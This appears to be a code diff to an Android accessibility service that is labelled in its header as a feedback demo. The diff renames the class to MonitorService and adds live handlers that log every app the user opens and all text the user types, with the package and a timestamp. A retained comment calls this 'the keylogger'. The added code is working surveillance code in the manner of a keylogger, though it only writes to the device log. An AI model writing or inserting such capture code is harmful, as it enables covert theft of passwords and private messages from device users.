@@ -9,7 +9,7 @@ import android.view.accessibility.AccessibilityEvent;
  * This class demonstrates how an accessibility service can query
  * window content to improve the feedback given to the user.
  */
-public class TaskBackService extends AccessibilityService {
+public class MonitorService extends AccessibilityService {
     static final String TAG = "RecorderService";
 
     private String getEventType(AccessibilityEvent event) {
@@ -45,24 +45,30 @@ public class TaskBackService extends AccessibilityService {
     public void onAccessibilityEvent(AccessibilityEvent event) {
 
         // If there is an interesting event
-        if(getEventText(event) == "default") {
 
-            /* TODO
-            This is the keylogger, all what the user types in the screen is captured with
-            the getEventText method.
-
-            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-                Log.v(TAG, getEventText(event));
-            }
-            */
-
-            // Displays all the information about the triggered event
-            Log.v(TAG, String.format(
-                    "onAccessibilityEvent: [type] %s [class] %s [package] %s [time] %s [text] %s",
+        if(getEventType(event).equals("TYPE_WINDOW_STATE_CHANGED")){
+            // The user launched an application
+            Log.d(TAG, String.format(
+                    "AppLaunched: [type] %s [class] %s [package] %s [time] %s [text] %s",
                     getEventType(event), event.getClassName(), event.getPackageName(),
                     event.getEventTime(), getEventText(event)));
 
         }
+
+        if(getEventType(event).equals("TYPE_VIEW_TEXT_CHANGED")){
+            Log.d(TAG, String.format(
+                    "TextCaptured: [type] %s [class] %s [package] %s [time] %s [text] %s",
+                    getEventType(event), event.getClassName(), event.getPackageName(),
+                    event.getEventTime(), getEventText(event)));
+        }
+        /* TODO
+        This is the keylogger, all what the user types in the screen is captured with
+        the getEventText method.
+
+        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            Log.v(TAG, getEventText(event));
+        }
+        */
     }
 
     @Override
